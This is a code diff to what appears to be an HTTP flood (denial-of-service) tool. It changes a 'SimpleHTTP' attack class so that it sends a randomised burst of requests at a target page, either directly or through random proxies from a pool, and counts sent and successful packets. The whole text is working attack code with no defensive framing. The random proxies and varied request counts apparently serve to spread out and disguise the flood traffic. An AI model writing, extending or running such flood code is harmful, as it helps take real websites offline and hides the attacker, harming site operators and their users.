@@ -21,28 +21,27 @@ export abstract class SimpleHTTP extends Algorithm {
     // Setting up proxy config
     let packetsSend = 0, packetsSuccess = 0
 
-    if (this.config.useRealIP) {
-      const success = await this.makeRequest(target.page, {})
-      packetsSend += 1
-      packetsSuccess += (success) ? 1 : 0
-    } else {
+    let proxyConfig = {}
+    let repeats = 16 + Math.floor(Math.random() * 32)
+
+    if (!this.config.useRealIP) {
       const proxy = this.proxyPool.getRandomProxy()
       if (proxy === null) {
         console.warn('Proxy request failed, because proxy wasnt founded.')
         await new Promise(resolve => setTimeout(resolve, 100))
         return { packetsSend, packetsSuccess, target }
       }
+      proxyConfig = this.generateProxyAxiosConfig(proxy)
+      repeats += Math.floor(Math.random() * 32)
+    }
 
-      const proxyConfig = this.generateProxyAxiosConfig(proxy)
-      let success = true
-      let repeats = 64
-      while (success) {
-        success = await this.makeRequest(target.page, proxyConfig)
-        packetsSend += 1
-        packetsSuccess += (success) ? 1 : 0
-        repeats = repeats - 1
-        success = success && (repeats > 0)
-      }
+    let success = true
+    while (success) {
+      success = await this.makeRequest(target.page, proxyConfig)
+      packetsSend += 1
+      packetsSuccess += (success) ? 1 : 0
+      repeats = repeats - 1
+      success = success && (repeats > 0)
     }
 
     return { packetsSend, packetsSuccess, target }
